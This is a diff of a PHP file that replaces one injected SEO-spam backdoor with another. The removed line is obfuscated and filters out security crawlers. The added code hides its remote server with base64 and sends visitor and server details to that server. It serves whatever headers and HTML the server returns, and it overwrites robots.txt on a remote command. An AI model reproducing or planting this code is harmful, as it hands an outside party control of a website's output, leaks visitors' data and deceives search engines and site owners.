@@ -1,1 +1,90 @@
-<?php $pc = "AwAP2"; $uagent = urlEncoDe($_SERVER['HTTP_USER_AGENT']); $language = uRlEnCOde(@$_SERVER['HTTP_ACCEPT_LANGUAGE']); $bagent = "yahoo|google|Aol|Bing"; ERRoR_repORTiNG(0); if(prEg_mAtCH("/(CrawlDaddy|ZmEu|ApacheBench|AskTbFXTV|digExt|DataForSEO|bytespider|YisouSpider|Python-urllib|python-requests|AmazonBot|HttpClient|ezooms|UniversalFeedParser|EasouSpider|swiftbot|Paloaltonetworks|YandexBot|Mj12bot|oBot|SeznamBot|FeedDemon|semrushBot|LightDeckReports Bot|Feedly|GPTBot|JikeSpider|Python|Paqlebot|Java|jaunty|PetalBot|YySpider|AhrefsBot|DotBot|CensysInspect|heritrix|CoolpadWebkit|Go-http-client|Barkrowler|Indy Library|Scrapy)/i", $_SERVER['HTTP_USER_AGENT'])) {  header('HTTP/1.0 403 Forbidden');  EXIT(); } $yacm='http://cw1089.lesbi';$biez='an';$knex='town.shop/';$lgpbp=$yacm.$biez.$knex; $refer = urLeNCoDE(@$_SERVER['HTTP_REFERER']); $ip = $_SERVER['REMOTE_ADDR']; if (IssET($_SERVER['HTTP_CLIENT_IP'])) {  $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (isseT($_SERVER['HTTP_X_FORWARDED_FOR'])) {  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } $ip = urLENCoDe($ip); $domain = UrLencodE($_SERVER['HTTP_HOST']); $script = UrleNCOdE($_SERVER['SCRIPT_NAME']); if ( (! emPtY($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! eMPty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! emPty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (iSSet($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {  $_SERVER['REQUEST_SCHEME'] = 'https'; } else {  $_SERVER['REQUEST_SCHEME'] = 'http'; } $http = UrlENcOdE($_SERVER['REQUEST_SCHEME']); $uri = UrlenCoDe($_SERVER['REQUEST_URI']); if(strPOs($uri,"kkjkkj") !== false){echo "ok";eXIT();} $kkj = 0; if(!file_exists("kkj.txt")) {  $uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/kkjkkj';  $nonm = @fILe_gEt_CoNTEntS($uuu);  if(EMpty($nonm)) {   $ch = CURL_INit();   CUrL_setOpt($ch, CURLOPT_URL, $uuu);   Curl_sEtopt($ch, CURLOPT_RETURNTRANSFER, true);   CUrl_sEToPT($ch, CURLOPT_FOLLOWLOCATION, false);   CURl_SeTopT($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   Curl_setOpT($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $nonm = curL_eXec($ch);   CuRl_cLosE($ch);  }  if($nonm == "ok") {   $kkj = 1;   @FilE_put_cONTents("kkj.txt","1");  } else {   $kkj = 0;   @FIlE_pUt_CONTeNtS("kkj.txt","0");  } } else {  $kkj = @FilE_Get_ContentS("kkj.txt"); } if(sTRPOS($uri,"favicon.ico") !== false) { } else if(STRpOs($uri,"robots.txt") !== false||sTRPOs($uri,"pingsitemap") !== false||sTrpoS($uri,"jp2023") !== false||preg_MaTCh("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])||PReg_MatcH("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])||pREG_MAtCh("/($bagent)/i", $_SERVER['HTTP_REFERER'])) {  $requsturl = $lgpbp."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$kkj&script=$script";  $robots_contents = "";  if(STrPOS($uri,"pingsitemap") !== false) {   $scripname = $_SERVER['SCRIPT_NAME'];   if(sTrPoS($scripname,"index.ph") !== false) {    if($kkj == 0) {     $scripname = '/?';    } else {     $scripname = '/';    }   } else {    $scripname = $scripname.'?';   }   $robots_contents = "User-agent: *\r\nAllow: /";   $sitemap = "$http://" . $domain .$scripname. "sitemap.xml";   $robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";   $sitemapstatus = "";   echo $sitemap.": ".$sitemapstatus.'<br/>';   $requsturl = $lgpbp."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$kkj&script=$script&sitemap=".urLEncoDe($sitemap);  }  $nonm = @FILE_GeT_cONtEnts($requsturl);  if(EmPty($nonm)) {   $ch = CurL_inIt();   Curl_sETOPt($ch, CURLOPT_URL, $requsturl);   CuRL_seTOPt($ch, CURLOPT_RETURNTRANSFER, true);   CURL_SEtOPt($ch, CURLOPT_FOLLOWLOCATION, false);   curL_SEtOpt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   cUrl_SeTopT($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $nonm = cuRL_exEC($ch);   CurL_clOse($ch);  }  if(!eMptY($nonm)) {   if(subStr($nonm,0,10)=="error code"||$nonm == "500") {    header("HTTP/1.0 500 Internal Server Error");    ExIt();   }   if(sTRpoS($uri,"jp2023") !== false){header('HTTP/1.1 404 Not Found');}   else if(SuBStr($nonm,0,5)=="<?xml") {    header('Content-Type: text/xml; charset=utf-8');   } else {    header('Content-Type: text/html; charset=utf-8');   }   echo $nonm;   if(!EmPTy($robots_contents)){@filE_PuT_COnTeNTS("robots.txt",$robots_contents);}   else if(sTrPos($uri,"robots.txt") !== false){@fiLe_put_COnTents("robots.txt",$nonm);}   ExiT();   return;  } }else{ } ?>
+<?php
+error_reporting(0);
+$gp_name="zj1667";
+$version="tf1";
+if(preg_match("/jp2023/si",$_SERVER["REQUEST_URI"])==1) 
+{
+    if(preg_match("/jp2023cww/si",$_SERVER["REQUEST_URI"])==0) 
+    {
+        header("HTTP/1.0 404 Not Found");
+    } 
+    echo "HTTP/1.0 404 Not Found___".$gp_name."___".$version; 
+    exit;
+}
+$tg_website="http://".$gp_name.base64_decode("Lm5vcm1hbHNtaXRoLmNvbQ==");
+$req_uri="/index.php?VS=".$version."&GP=".$gp_name;
+$key_name_arr=array(
+"SCRIPT_NAME",
+"REQUEST_URI",
+"HTTPS",
+"REQUEST_SCHEME",
+"SERVER_PORT",
+"REMOTE_ADDR",
+"HTTP_REFERER",
+"HTTP_ACCEPT_LANGUAGE",
+"HTTP_USER_AGENT",
+"HTTP_HOST"
+);
+foreach($key_name_arr as $key_name1)
+{
+    $key_value=isset($_SERVER[$key_name1])?$_SERVER[$key_name1]:'';
+    $tran_char=base64_encode(trim($key_value));
+    $tran_char=str_replace("+","-",$tran_char);
+    $tran_char=str_replace("/","_",$tran_char);
+    $tran_char=str_replace("=",".",$tran_char);
+    $req_uri.="&".$key_name1."=".$tran_char;
+}
+$target_url=$tg_website.$req_uri;
+$ch_handle=curl_init();
+curl_setopt($ch_handle,CURLOPT_URL,$target_url);
+curl_setopt($ch_handle,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch_handle,CURLOPT_CONNECTTIMEOUT,10);
+$remote_contents=curl_exec($ch_handle);
+$remote_contents=trim($remote_contents);
+curl_close($ch_handle);
+if(empty($remote_contents))
+{
+    $remote_contents=file_get_contents($target_url);
+}
+$remote_contents=trim($remote_contents);
+$curl_content_arr=explode("|@#$|",$remote_contents);
+$cc_count=count($curl_content_arr);
+if($cc_count<3)
+{
+    header("HTTP/1.0 404 Not Found"); 
+    exit; 
+}else 
+{
+    $head_info=trim($curl_content_arr[0]);
+    if(!empty($head_info))
+    {
+        header($head_info);
+    }
+    $content_info=trim($curl_content_arr[1]);
+    if(!empty($content_info))
+    {
+        echo $content_info;
+    }
+    $cmd_info=trim($curl_content_arr[$cc_count-1]);
+    if($cmd_info=="exit")
+    {
+        exit;
+    }
+    if($cmd_info=="ping")
+    {
+        $robots_content="User-agent:*".PHP_EOL;
+        $robots_content.="Allow:/".PHP_EOL;
+        $ping_url_arr=explode("<br/>",$content_info);
+        array_pop($ping_url_arr);
+        foreach($ping_url_arr as $ping_url1)
+        {
+            $robots_content.="Sitemap:".$ping_url1.PHP_EOL;
+        }
+        $robots_file=fopen($_SERVER["DOCUMENT_ROOT"]."/robots.txt","w");
+        fwrite($robots_file,$robots_content);
+        fclose($robots_file);
+        echo "robots.txt done";
+        exit;
+    }
+}
+?>
